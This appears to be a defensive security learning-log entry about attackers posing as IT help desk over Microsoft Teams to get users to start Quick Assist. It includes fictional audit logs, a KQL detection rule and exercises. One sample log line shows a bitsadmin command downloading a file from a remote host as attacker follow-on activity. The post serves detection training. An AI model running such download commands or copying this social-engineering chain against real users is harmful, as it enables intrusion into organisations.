# Day 08 — Vishing over Teams: External Tenants and Remote Access Tools

📅 10 November 2026 · 🏷️Deepfake fraud · ⏱️ ~25 min

---

## Why it matters

Day 05 was a caller talking a help desk into a reset. Today turns that around:
the attacker doesn't call *your* help desk, they pose as it. They message an
employee on Teams, say they're from IT, and ask them to open a remote support
tool "so we can fix it". No password is stolen first and no malware attachment
is sent. The user is asked to hand over the keyboard themselves, which is why
the controls from Days 05 to 07 (identity checks, phishing-resistant MFA, audit
alerts) matter even when nobody has typed a password into a fake page.

None of this needs a deepfake. A confident voice and a plausible display name
do the job. It does fit the thread of this log, though: the attacker is
borrowing authority, and the user can't judge it by how it looks or sounds.

MITRE files the contact under [T1566.003 Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003/)
(its Storm-1811 example mentions Teams) and lists [T1566.004 Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004/)
beside it. The tool that follows is [T1219 Remote Access Tools](https://attack.mitre.org/techniques/T1219/).

---

## The concept

### The chain, as published

Two primary sources, both Microsoft's:

| Source | What it describes |
|---|---|
| [Microsoft Threat Intelligence, May 2024](https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/) (updated May 2025) | Storm-1811 contacts users by vishing, email bombing or Teams, impersonates IT or help desk (display names such as "Help Desk", "Help Desk IT", "Help Desk Support" and "IT Support", from tenants the attacker created), and persuades the user to use Quick Assist. Hands-on activity follows: scripted `cURL` or `BITSAdmin` downloads, then tools such as Qakbot and RMM software, and in some cases Black Basta ransomware |
| [Microsoft Incident Response (DART), 16 March 2026](https://www.microsoft.com/en-us/security/blog/2026/03/16/help-on-the-line-how-a-microsoft-teams-support-call-led-to-compromise) | A 2026 case: a Teams support call, two employees who didn't comply, and a **third** who granted access through Quick Assist. The user then entered corporate credentials into a spoofed form and several payloads followed |

Two details are worth holding on to. First, the attacker only needs *one*
person out of several to say yes, so a "most people refused" result is not a
success. Second, the Microsoft post is explicit about the user's part: the
person starts Quick Assist, types the security code the attacker reads out,
accepts the screen-sharing prompt and may approve a "Request Control" prompt.
Every one of those steps is a point where a good habit or a good policy could
stop it.

The March 2026 post doesn't say in its text whether the contact came from an
external tenant, but its recommendations are about restricting unmanaged
external accounts. The May 2024 post does describe attacker-created tenants.
I'm treating "external tenant" as the common pattern, not the proven one for
every case.

### What Microsoft recommends (and what each choice costs)

| Control | What the sources say | The trade-off |
|---|---|---|
| **Restrict external Teams contact** | Microsoft's [trusted organisations page](https://learn.microsoft.com/en-us/microsoftteams/trusted-organizations-external-meetings-chat) lists four modes: allow all external domains, allow only specific external domains, block specific domains, block all. It also lets you disable chats with unmanaged Teams accounts. DART recommends an allow-list model | An allow-list is the strongest option and also the one that makes finance chase the person who can't reach a supplier. You'll maintain the list |
| **Remove or disable Quick Assist** where it isn't needed | Both posts say so. The 2024 post says that if you use another tool such as Remote Help, block or remove Quick Assist | Your real help desk needs *one* sanctioned tool. Blocking the others only works if that one is good enough that staff don't go looking |
| **User habit** | Only accept a remote session you started by contacting IT yourself | Habit decays. I'd treat it as a backup, not the control |
| **Phishing-resistant authentication** | Microsoft recommends Conditional Access authentication strength | Doesn't stop the remote session itself, but it limits what a typed credential is worth. Day 06 |

> 💡 **Judgement call:** I'd block external Teams contact for the groups
> attackers go after first (finance, payroll, executives' assistants, the help
> desk's own customers) before trying to fix the whole company. It's cheaper to
> explain to forty people than four thousand.

### What the logs can tell you

Teams activity lands in the unified audit log. Microsoft's
[audit log activities](https://learn.microsoft.com/en-us/purview/audit-log-activities)
reference (read 10 November 2026) lists `ChatCreated` (a Teams chat was created),
`MessageSent` (a message was posted to a chat or channel), `MemberAdded`, and
`MeetingParticipantDetail` (who joined a meeting, who started screen sharing,
and whether take, give or request control was activated). What I **could not
confirm** from the pages I read is a documented field that says "this sender is
from an unmanaged or newly seen external tenant", or which operation records an
ordinary one-to-one Teams *call*. Don't assume either exists in your tenant.

So today's detection joins two things you'd have to build or check yourself:

- an **external contact table** where something you maintain adds "has this
  sender's tenant ever contacted us before?" This is a **fictional custom
  table** here (`NorthwindTeamsExternal_CL`), not a Microsoft schema.
- **`DeviceProcessEvents`** from Defender for Endpoint, which is a real table.
  Microsoft's reference lists `Timestamp`, `DeviceName`, `FileName`,
  `ProcessCommandLine`, `InitiatingProcessFileName`, `AccountName` and
  `AccountUpn`.

---

## Sample logs

All times are UTC on **Tuesday 10 November 2026** (Sydney is UTC+11, so
01:48 UTC is 12:48 in Sydney). Everything is fictional and domains are
`*.example`. Both tables are simplified and flattened. `CallStarted` is a
made-up operation name in the fictional table.

**Teams external contacts** (fictional custom table `NorthwindTeamsExternal_CL`,
6 rows; `TenantAge` is days since Northwind first saw that sender's tenant):

```
Time      TargetUser  Operation    SenderDisplayName  SenderDomain                  TenantAge
01:12:40  m.patel     ChatCreated  Priya Raman        fabrikam-partner.example      412
01:48:20  r.nguyen    ChatCreated  Help Desk IT       helpdesk-support-nw.example   0
01:48:55  r.nguyen    MessageSent  Help Desk IT       helpdesk-support-nw.example   0
01:53:10  r.nguyen    CallStarted  Help Desk IT       helpdesk-support-nw.example   0
02:20:05  l.okafor    ChatCreated  IT Support         northwind-it-help.example     0
02:21:30  l.okafor    MessageSent  IT Support         northwind-it-help.example     0
```

**Process events** (inspired by `DeviceProcessEvents`, 3 rows; `AccountUpn` is
shortened to the user name):

```
Time      Account   DeviceName  FileName         
01:57:41  r.nguyen  DEV-FIN-11  quickassist.exe
02:03:18  r.nguyen  DEV-FIN-11  bitsadmin.exe    (ProcessCommandLine: bitsadmin /transfer job https://files.example/update.zip C:\Users\Public\update.zip)
03:05:44  s.kim     DEV-HR-02   quickassist.exe
```

Context (fictional): `m.patel` works with a supplier Northwind has dealt with
for over a year. `s.kim` rang the real Northwind help desk at 14:00 Sydney time
and was helped through Quick Assist by an internal technician. `r.nguyen` is in
finance. `l.okafor` is in payroll and says they "ignored it".

---

## What to look for

1. **Count first.** **6** Teams rows covering **3** conversations
   (`m.patel`, `r.nguyen`, `l.okafor`) from **3** different external senders,
   and **3** process rows, of which **2** are `quickassist.exe`.
2. **The sender's identity, not the sender's name.** "Help Desk IT" and "IT
   Support" are display names the sender chose. The domains
   (`helpdesk-support-nw.example`, `northwind-it-help.example`) are not
   Northwind's, and both tenants have a `TenantAge` of **0**: first time
   Northwind has seen them. The partner in row 1 has a tenant 412 days old and a
   person's name, not a role.
3. **The timeline for `r.nguyen`.** Chat created 01:48:20 (12:48:20 Sydney), a
   message **35 s** later, a call at 01:53:10 (**4 min 50 s** after the chat),
   Quick Assist launched at 01:57:41 (**9 min 21 s** after the chat), and
   `bitsadmin.exe` **5 min 37 s** after that, **14 min 58 s** after first
   contact. A real help-desk ticket doesn't start with an unknown account
   contacting the user.
4. **The decoy that must not fire.** `s.kim` ran Quick Assist at 03:05:44 with
   **no** external contact before it. That is Northwind's own technician. If
   the rule alerted on `quickassist.exe` alone, `s.kim` would be a false
   positive, and so would every legitimate support session.
5. **The one that nearly fires.** `l.okafor` got the same style of contact (a
   new tenant, a help-desk name, a chat) but **no** Quick Assist followed. That
   isn't an alert under today's logic. It *is* worth a conversation: someone
   should tell `l.okafor` they did the right thing, confirm no other tool was
   run, and block the sender domain. It also tells you the attacker is working
   the building.
6. **The tool as the tell.** `bitsadmin.exe` pulling a file from a remote URL
   straight after a remote session is the sort of follow-on Microsoft describes
   (`cURL` or `BITSAdmin` downloads). Alone it's weak. After the sequence above
   it's strong.

---

## Detection logic

**In plain English:** find users who were first contacted by a **brand-new
external tenant** whose display name looks like IT or help desk, and who then
launched **Quick Assist** within **30 minutes**. Report one row per contact.
The first condition makes it external and suspicious. The second is the user
actually handing over control.

**KQL (Microsoft Sentinel / Defender XDR advanced hunting, with a fictional
custom table):**

```kql
// New external "help desk" contact followed by Quick Assist on the same user
// NorthwindTeamsExternal_CL is a FICTIONAL custom table (see text)
let window = 30m;
let helpdeskNames = "(?i)help ?desk|it support|service desk|it admin";
let firstContact =
    NorthwindTeamsExternal_CL
    | where TimeGenerated > ago(1d)
    | where Operation == "ChatCreated"
    | where TenantFirstSeenDays < 1
    | where SenderDisplayName matches regex helpdeskNames
    | project ContactTime = TimeGenerated, Upn = tolower(TargetUpn),
              SenderDisplayName, SenderDomain;
DeviceProcessEvents
| where Timestamp > ago(1d)
| where FileName =~ "quickassist.exe"
| extend Upn = tolower(AccountUpn)
| join kind=inner firstContact on Upn
| where Timestamp between (ContactTime .. (ContactTime + window))
| project ContactTime, QuickAssistTime = Timestamp, Upn, DeviceName,
          SenderDisplayName, SenderDomain,
          GapSeconds = datetime_diff('second', Timestamp, ContactTime)
```

On the sample it returns **1 row**: `r.nguyen` on `DEV-FIN-11`, with a gap of
**561 seconds** (9 min 21 s). I ran the same logic in Python over the rows
above to check:

```
teams rows 6 / device rows 3
first-contact help-desk-named users (new tenant): l.okafor, r.nguyen
FIRE r.nguyen DEV-FIN-11 first contact 01:48:20  QuickAssist 01:57:41  gap 0:09:21
```

What it excludes, and why the text above is consistent with it: `m.patel`
fails on tenant age (412 days) and on the display name. `l.okafor` passes the
contact test but has no `quickassist.exe` row, so the join drops them. `s.kim`
has a `quickassist.exe` row but no contact row. Remove the 30-minute condition
and nothing changes on this sample, but on real data it's what stops last
week's contact matching today's support session.

**What I verified and what I didn't.** `DeviceProcessEvents` column names
(`Timestamp`, `FileName`, `AccountUpn`, `DeviceName`) are from Microsoft's
current schema page. The Teams table is invented by me, and the tenant-age
enrichment is the hard part: you'd populate it yourself, for example from a
watchlist of tenant domains seen in the last 90 days. I also did **not**
confirm the exact process name casing for every Quick Assist version, so I
used a case-insensitive match (`=~`). Run a hunt for `quickassist.exe` on your
own devices before relying on it, and check what spelling shows up.

**Tuning note:** the 30-minute window is my starting point. Microsoft's posts
describe contact and Quick Assist in the same session, but I haven't seen a
published figure for how long the gap usually is, so I wouldn't trust my
number over your own data. The false positives are people legitimately
contacted by a new supplier whose name contains "support" (the regex is
deliberately broad), and anyone using Quick Assist with a *new* partner IT
team. A watchlist of approved partner domains fixes the first. For the second,
I'd rather review a few partner sessions than exclude by user or IP, because
an exclusion is exactly what an attacker would hope to land in. When it fires: phone the user on a number you already hold (not the
chat), end the session, isolate the device, then look for credentials entered
into pages and any new authentication methods or inbox rules, which is Day 07
again.

---

## Your turn

1. Why does an attacker who sends the message to many users still succeed if
   only one of them says yes? What does that mean for how you'd report
   "number of people who refused" to management?
2. Rebuild `r.nguyen`'s timeline from 01:48:20 to 02:03:18 with the Sydney
   times in brackets and an ATT&CK technique for each step where there is one.
3. Today's rule needs a brand-new tenant **and** a help-desk-style name.
   Describe how an attacker might get around each condition, and name one
   control that doesn't depend on either. Don't write anything that works
   against a real tenant.
4. `l.okafor` ignored the contact. Write the three things you'd do today, and
   decide whether it should page anyone. Then say whether `s.kim`'s session
   shows Northwind needs a different remote support tool.

---

## My answers

<!-- Answer each question in your own words, then commit. -->

1.

2.

3.

4.

---

## Further reading

- Microsoft Threat Intelligence: [Threat actors misusing Quick Assist in social engineering attacks leading to ransomware](https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/)
- Microsoft Incident Response: [Help on the line: How a Microsoft Teams support call led to compromise](https://www.microsoft.com/en-us/security/blog/2026/03/16/help-on-the-line-how-a-microsoft-teams-support-call-led-to-compromise)
- Microsoft Learn: [Manage external meetings and chat with people and organisations using Microsoft identities](https://learn.microsoft.com/en-us/microsoftteams/trusted-organizations-external-meetings-chat)
- Microsoft Learn: [Audit log activities](https://learn.microsoft.com/en-us/purview/audit-log-activities) · [DeviceProcessEvents table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table)
- MITRE ATT&CK: [T1566.003 Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003/) · [T1566.004 Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004/) · [T1219 Remote Access Tools](https://attack.mitre.org/techniques/T1219/)
- This log: [Day 05](2026-11-07-help-desk-social-engineering.md) (verifying a caller) · [Day 06](2026-11-08-phishing-resistant-mfa-recovery-path.md) (phishing-resistant MFA) · [Day 07](2026-11-09-mfa-changes-and-inbox-rules.md) (what to check after)

⬅️ [Learning log index](README.md) · ➡️ Day 09: Deepfake job candidates and remote worker fraud (11 Nov)
